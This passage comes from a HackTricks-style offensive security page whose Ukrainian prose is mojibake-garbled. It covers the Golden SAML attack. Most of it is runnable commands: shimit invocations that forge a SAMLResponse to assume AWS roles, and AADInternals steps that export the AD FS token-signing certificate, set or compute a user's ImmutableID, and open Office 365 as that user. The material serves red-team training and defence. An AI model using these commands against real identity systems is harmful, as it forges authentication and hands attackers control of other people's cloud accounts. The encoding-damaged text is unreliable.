–ó —É—Å—ñ—î—é —Ü—ñ—î—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—î—é, –º–æ–∂–ª–∏–≤–æ –∑–∞–±—É—Ç–∏ –¥—ñ–π—Å–Ω–∏–π SAMLResponse —è–∫ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —è–∫–æ–≥–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –≤–∏–¥–∞–≤–∞—Ç–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ [**shimit**](https://github.com/cyberark/shimit)**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### On-prem -> cloud
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
–ú–æ–∂–ª–∏–≤–æ —Ç–∞–∫–æ–∂ —Å—Ç–≤–æ—Ä–∏—Ç–∏ ImmutableID –¥–ª—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤ —Ç—ñ–ª—å–∫–∏ –≤ —Ö–º–∞—Ä—ñ —Ç–∞ –≤–∏–¥–∞–≤–∞—Ç–∏ —Å–µ–±–µ –∑–∞ –Ω–∏—Ö
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
–í—á—ñ—Ç—å—Å—è —Ç–∞ –ø—Ä–∞–∫—Ç–∏–∫—É–π—Ç–µ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>–ü—ñ–¥—Ç—Ä–∏–º–∞–π—Ç–µ HackTricks</summary>

* –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ø–ª–∞–Ω–∏ –ø—ñ–¥–ø–∏—Å–∫–∏**](https://github.com/sponsors/carlospolop)!
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ —É **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **–î—ñ–ª—ñ—Ç—å—Å—è —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –ø–æ–¥–∞—é—á–∏ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ github.

</details>
{% endhint %}
